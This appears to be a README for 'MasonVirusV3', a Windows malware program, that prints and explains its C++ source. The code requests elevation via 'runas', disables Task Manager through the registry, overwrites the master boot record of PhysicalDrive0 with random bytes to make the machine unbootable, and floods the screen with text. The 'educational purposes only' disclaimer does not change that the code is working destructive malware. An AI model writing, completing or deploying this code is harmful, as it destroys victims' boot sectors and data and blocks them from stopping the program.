# MasonVirusV3

![MasonVirusV3](https://i.ibb.co/R2rKXqY/image.png)

## Overview
This program is a demonstration of various advanced system manipulation techniques, including MBR overwriting, disabling system utilities, and simulating visual and input effects. The following sections explain each part of the code in detail.

---

### Checking for Administrator Privileges
```cpp
bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        if (CheckTokenMembership(NULL, adminGroup, &isAdmin) == 0) {
            isAdmin = FALSE;
        }
        FreeSid(adminGroup);
    }
    return isAdmin == TRUE;
}
```

- **Purpose**:  
  This function checks whether the program is running with administrative privileges.

- **How it works**:  
  1. A security identifier (SID) for the "Administrators" group is created using `AllocateAndInitializeSid`.
  2. The program checks if the current process's token belongs to this group using `CheckTokenMembership`.
  3. If the token indicates membership, the function returns `true`, indicating admin privileges.
  4. The SID is freed after use to prevent memory leaks.

---

### Requesting Administrator Privileges
```cpp
void RequestAdminPrivileges() {
    if (!IsRunningAsAdmin()) {
        WCHAR szFilePath[MAX_PATH];
        GetModuleFileName(NULL, szFilePath, MAX_PATH);
        ShellExecute(NULL, L"runas", szFilePath, NULL, NULL, SW_SHOWNORMAL);
        ExitProcess(0);
    }
}
```

- **Purpose**:  
  This function requests administrative privileges if the program is not already running as an administrator.

- **How it works**:  
  1. It checks for admin privileges using `IsRunningAsAdmin`.
  2. If not running as admin, it restarts the program with elevated privileges using `ShellExecute` with the `"runas"` verb.
  3. The current process exits to allow the elevated instance to take over.

---

### Disabling Task Manager
```cpp
void DisableTaskManager() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD dwData = 1;
        RegSetValueEx(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&dwData, sizeof(dwData));
        RegCloseKey(hKey);
    }
}
```

- **Purpose**:  
  Disables the Task Manager to prevent the user from terminating the program.

- **How it works**:  
  1. Opens the registry key `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System`.
  2. Sets the value `DisableTaskMgr` to `1`, which disables Task Manager.
  3. Closes the registry key after making changes.

---

### Overwriting the Master Boot Record (MBR)
```cpp
void OverwriteMBR() {
    HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive == INVALID_HANDLE_VALUE) {
        return;
    }
    BYTE mbrData[MBR_SIZE];
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    for (int i = 0; i < MBR_SIZE; i++)
        mbrData[i] = dis(gen);
    DWORD bytesWritten;
    WriteFile(hDrive, mbrData, MBR_SIZE, &bytesWritten, NULL);
    CloseHandle(hDrive);
}
```

- **Purpose**:  
  This function overwrites the Master Boot Record (MBR) of the primary physical drive, effectively rendering the system unbootable.

- **How it works**:  
  1. Opens a handle to the primary physical drive (`PhysicalDrive0`) with write access.
  2. Generates random data to fill a buffer of 512 bytes (the size of the MBR).
  3. Writes this random data to the drive, overwriting the MBR.
  4. Closes the handle to the drive.

- **Warning**:  
  This operation is extremely destructive and should only be executed with a full understanding of its consequences.

---

### Displaying Random Text on the Screen
```cpp
void DisplayRandomText() {
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"ABOLHB"; // ENTER YOUR NAME
    while (true) {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(SM_CXSCREEN);
        sy = GetSystemMetrics(SM_CYSCREEN);
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
        Sleep(10);
    }
}
```

- **Purpose**:  
  Randomly displays a predefined text string on the screen at random positions.

- **How it works**:  
  1. Retrieves the device context (HDC) of the desktop window.
  2. Calculates the screen dimensions using `GetSystemMetrics`.
  3. Displays the text at random positions using `TextOutW`.
  4. The function runs in an infinite loop, continuously displaying the text.

---

## Disclaimer
This program contains potentially harmful code, including MBR overwriting, which can permanently damage a computer. Use this code for educational purposes only and at your own risk.

---

## Acknowledgments
- **Coded By**: ABOLHB
- **Group**: FREEMASONRY

### Disclaimer of Liability
The author and group disclaim any liability for misuse of this code. This software is provided "as is" for educational purposes only. Any damage caused by its use is the sole responsibility of the user.



